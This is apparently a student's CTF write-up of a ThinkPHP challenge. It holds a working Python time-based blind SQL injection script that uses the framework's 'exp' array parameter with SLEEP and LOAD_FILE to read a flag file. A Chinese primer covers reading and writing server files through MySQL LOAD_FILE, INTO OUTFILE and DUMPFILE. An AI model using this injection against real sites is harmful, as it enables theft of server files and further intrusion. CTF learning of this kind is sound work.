#### A week conclude

It is near the final exam week so that I have not much time for the solving ,It is late for the conclude

###### A new injection point in think php  

##### NCTF 摆就完事了2.0

First:the pre-knowledge you need to know:

In think php frame,what we need to notice  is that the entrance we visit a file: is often start with prefix called index.php,and /index behind means A controler that lead to the directory    m1saka_m1yuu/index refer to the method that we request for

through the dirserach.py we get www.zip for sourcecode,get its waf and know the table name,and what we need to SQL injection,its approximately like a blind injection,that we need to,use python script to solve it .

A function +1

LOAD_FILE()

```在MySQL中，*load_file*函数是一个非常有用的工具，它允许你从文件系统中读取文件内容。这个函数通常用于读取配置文件或者尝试获取webshell以及提权过程中。然而，要成功使用*load_file*函数，需要满足一些特定的条件。
使用条件

**文件权限**：必须有权限读取文件，并且文件必须是完全可读的。**文件大小**：文件必须小于*max_allowed_packet*的值。**文件路径**：必须指定文件的完整路径。**服务器设置**：*secure_file_priv*的值必须允许对文件路径进行操作。

查看和设置

查看*secure_file_priv*的值： *SHOW GLOBAL VARIABLES LIKE 'secure_file_priv';*查看*max_allowed_packet*的值： *SHOW GLOBAL VARIABLES LIKE 'max_allowed_packet';*如果需要修改*max_allowed_packet*的值，可以使用： *SET GLOBAL max_allowed_packet = 5 \* 1024 \* 1024;*

读取文件

使用*load_file*函数读取文件的基本语法是：

SELECT load_file('完整文件路径');

例如，如果你想读取位于*/etc/hosts*的文件，你可以使用：

SELECT load_file('/etc/hosts');

如果文件不存在或者由于权限或其他原因无法读取，*load_file*函数将返回NULL。

写入文件

在某些情况下，你可能需要将数据写入文件。这可以通过*INTO OUTFILE*或*DUMPFILE*来实现。例如，将字符串'lyz'写入*/tmp/lyz.txt*文件：

SELECT 'lyz' INTO OUTFILE '/tmp/lyz.txt';

或者使用*DUMPFILE*写入二进制数据：

SELECT '123' INTO DUMPFILE '/usr/local/mysql/1.txt';

注意事项

*load_file*函数只能读取服务器上的文件。在Windows系统下，如果NTFS权限设置得当，可能无法读取某些文件。在实际的SQL注入攻击中，获取文件的绝对物理路径是一个挑战。使用*load_file*函数时，必须考虑到文件的权限和大小限制。
通过满足上述条件并正确设置MySQL服务器，*load_file*函数可以成为一个强大的工具，用于访问和操作文件系统中的数据。
```



```python
import requests
import time
import string

url = 'http://node5.anna.nssctf.cn:27329/public/index.php/index/m1saka_m1yuu/index'
flag = ''

# 扩展字符集（包含所有可打印字符）
charset = string.printable#it is a quick method to use for fill the dict in charset

# 计算基准网络延迟
def get_base_delay():
    base_time = 0
    for _ in range(3):
        start = time.time()
        requests.get(url, params={'username[0]': 'exp', 'username[1]': '0'})
        base_time += time.time() - start
    return base_time / 3 * 1.2  # 增加20%容差

base_delay = get_base_delay()
print(f"[*] 基准延迟: {base_delay:.2f}s")

for i in range(1, 100):
    found = False
    for j in charset:
        # 使用ORD确保整数比较，避免类型问题
        payload = f'ORD(SUBSTR(LOAD_FILE("/var/www/html/ffllaagg.php"),{i},1))={ord(j)}'
        params = {
            'username[0]': 'exp',
            'username[1]': f'IF(({payload}),SLEEP(1.5),0)'
        }
        
        # 连续验证3次减少误报
        success_count = 0
        for _ in range(3):
            start = time.time()
            requests.get(url, params=params)
            elapsed = time.time() - start
            if elapsed > base_delay + 1.2:  # 总延迟 > 基准+1.2s
                success_count += 1
        
        # 3次中有2次成功即判定有效
        if success_count >= 2:
            flag += j
            print(f'[+] 位置 {i}: 字符 "{j}" | 当前FLAG: {flag}')
            found = True
            break
    
    if not found:
        print(f"[-] 位置 {i} 无匹配字符，终止扫描")
        break

```

###### A crazy waf in php:

##### Boring code

refer to that wp:

``[bytectf2019 boring_code的知识学习&&无参数函数执行&&上海市大学生CTF_boring_code+ - yunying - 博客园](https://www.cnblogs.com/BOHB-yunying/p/11616311.html)``

###### also some XEE for my little get to know XML format sometime for the format bypass,sometime for the encoding method bypass  

 
